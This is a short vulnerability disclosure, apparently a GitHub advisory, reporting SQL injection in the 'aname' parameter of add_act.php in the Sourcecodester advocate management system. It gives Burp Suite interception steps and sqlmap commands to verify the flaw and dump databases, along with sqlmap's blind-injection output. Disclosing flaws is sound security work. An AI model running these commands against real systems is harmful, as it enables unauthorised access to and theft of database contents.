---
slug: sourcecodester-advocate-management-system-add-act
title: Sourcecodester advocate management system (add_act.php)
---

http://localhost/kortex_lite/kortex_lite/control/add_act.php


## Report

Related Code file: /control/add_act_.php

Injection parameter: MULTIPART aname

POST parameter 'MULTIPART aname' is vulnerable.

![1](https://github.com/user-attachments/assets/2ac11e6e-0bc7-4237-b6b5-fd849060ead0)

Intercept request using Burpsuite Proxy.

![2](https://github.com/user-attachments/assets/4e01c27e-2b1f-4968-8264-7cbe95dc6fc5)

Save the request to `add_act.txt`.


### Verify vulnerability

```
sqlmap -r add_act.txt --batch
```

![51](https://github.com/user-attachments/assets/33cbe30f-640d-42cb-a5f2-19d0ab89e9a3)

```
Parameter: MULTIPART aname ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: -----------------------------8879615583215427378340903645
Content-Disposition: form-data; name="aname"
```

### Dump databases

```
sqlmap -r add_act.txt --batch --dbs
```

![52](https://github.com/user-attachments/assets/6996d06c-b036-4155-a612-4200f23dc671)
